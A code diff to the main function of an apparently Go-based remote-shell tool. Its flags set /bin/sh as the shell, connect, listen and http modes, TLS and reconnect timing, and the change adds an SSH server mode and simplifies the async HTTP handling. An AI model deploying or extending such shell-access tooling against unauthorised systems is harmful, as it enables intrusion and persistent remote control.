@@ -28,10 +28,9 @@ func main() {
 	flag.StringVar(&port, "port", "1234", "Port")
 	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Unix Shell")
 	flag.BoolVar(&udp, "u", false, "Enable UDP")
-	flag.StringVar(&config.Mode, "m", "connect", "Mode: connect|listen|http")
+	flag.StringVar(&config.Mode, "m", "connect", "Mode: connect|listen|http|ssh")
 
 	flag.BoolVar(&tls, "tls", false, "Enable TLS")
-	flag.BoolVar(&async, "async", false, "Enable Asynchronous Shell")
 	flag.BoolVar(&config.HTTPServer, "server", false, "Run as HTTP Server")
 
 	flag.StringVar(&reconnect, "recon", "15s", "Reconnecting Time")
@@ -67,16 +66,12 @@ func main() {
 		}
 		break
 	case "http" :
-		if config.HTTPServer && async {
+		if config.HTTPServer {
 			AsyncHTTPServer(config)
-		} else if async {
+		} else {
 			AsyncHTTPClient(config)
-		} 
-		
-		// else if config.HTTPServer {
-		// 	HTTPServer(config)
-		// } else {
-		// 	HTTPClient(config)
-		// }
+		}
+	case "ssh" :
+		SSHServer(config)
 	}
 }
